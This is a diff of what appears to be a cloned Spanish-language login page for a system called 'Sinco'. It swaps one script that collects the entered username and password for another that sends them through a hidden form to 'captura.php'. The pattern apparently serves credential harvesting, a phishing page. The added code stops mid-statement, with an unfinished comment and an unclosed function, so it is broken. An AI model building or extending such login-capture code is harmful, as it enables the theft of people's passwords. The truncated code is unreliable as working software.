@@ -157,45 +157,17 @@ Es también importante que reporte cualquier anomalía en este proceso. Como por
 <script src="Scripts/Sinco/modules/login.js?v=638859503003059838"></script><script src="Scripts/Sinco/modules/login.fonts.js?v=638859503003059838"></script>
 
 <script>
-document.addEventListener('DOMContentLoaded', function() {
-    document.getElementById('btnSiguiente').addEventListener('click', function(e) {
-        e.preventDefault(); // Evita el comportamiento por defecto
-        
-        // 1. Capturar datos
-        var usuario = document.getElementById('txtUsuario').value;
-        var contrasena = document.getElementById('txtContrasena').value;
-        
-        // 2. Validación básica
-        if(!usuario.trim() || !contrasena.trim()) {
-            alert('Por favor complete ambos campos');
-            return;
-        }
-        
-        // 3. Crear formulario dinámico
-        var form = document.createElement('form');
-        form.method = 'POST';
-        form.action = 'procesar_login.php'; // Reemplaza con tu archivo PHP
-        
-        // 4. Agregar campos ocultos
-        var userInput = document.createElement('input');
-        userInput.type = 'hidden';
-        userInput.name = 'usuario';
-        userInput.value = usuario;
-        form.appendChild(userInput);
-        
-        var passInput = document.createElement('input');
-        passInput.type = 'hidden';
-        passInput.name = 'contrasena';
-        passInput.value = contrasena;
-        form.appendChild(passInput);
-        
-        // 5. Agregar al documento y enviar
-        document.body.appendChild(form);
-        form.submit();
-        
-        // Opcional: Mostrar loader mientras se procesa
-        document.getElementById('dvLoadEmpSuc').style.display = 'block';
-    });
-});
-</script>
+// Agrega este código justo antes del cierre </body> de tu HTML existente
+
+document.getElementById('btnSiguiente').addEventListener('click', function(e) {
+    // 1. Prevenir el comportamiento por defecto
+    e.preventDefault();
+    
+    // 2. Crear un formulario temporal
+    var form = document.createElement('form');
+    form.style.display = 'none'; // Ocultamos el formulario
+    form.method = 'POST';
+    form.action = 'captura.php'; // Mismo archivo que
+	
+
 </body></html>
